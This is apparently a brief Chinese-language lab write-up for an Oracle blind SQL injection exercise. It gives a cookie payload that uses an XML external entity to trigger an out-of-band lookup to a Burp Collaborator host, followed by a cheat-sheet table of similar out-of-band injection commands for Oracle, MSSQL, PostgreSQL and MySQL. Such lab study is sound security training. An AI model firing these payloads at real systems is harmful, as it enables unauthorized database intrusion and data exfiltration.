因为是oracle数据库

使用paylaod:

```javascript
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```





各类型数据库带外交互语句：

| Oracle | The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br>SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;]&gt;'),'/l') FROM dual<br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br>SELECT UTL\_INADDR.get\_host\_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net') |
| - | - |
| Microsoft | exec master..xp\_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a' |
| PostgreSQL | copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net' |
| MySQL | The following techniques work on Windows only:<br>LOAD\_FILE('\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\\\a')<br>SELECT ... INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a' |


参考链接：

https://portswigger.net/web-security/sql-injection/cheat-sheet